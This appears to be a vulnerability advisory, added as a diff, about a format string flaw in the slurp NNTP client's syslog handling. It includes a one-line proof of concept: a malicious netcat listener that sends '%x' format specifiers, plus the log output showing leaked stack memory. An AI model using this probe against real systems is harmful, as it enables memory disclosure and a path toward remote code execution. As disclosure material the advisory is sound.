@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/4935/info
+
+slurp is a freely available, open source NNTP client. It is designed for use on most Unix and Linux operating systems.
+
+It may be possible for a remote server to execute code on a vulnerable client. slurp offers functionality that allows the software to write messages to the system log. A format string vulnerability in the syslog function may allow a malicious server to supply a custom format string that writes to an arbitrary address in memory.
+
+perl -e 'print "200 Hello brother \n666 %x%x%x\n'" | nc -l -p 119
+
+Then check /var/log/messages for something like:
+
+Jun 5 05:10:22 yada slurp[39926]: do_newnews: NNTP protocol error: got '666 bfbff4f8804bc1bbfbff51c'
+
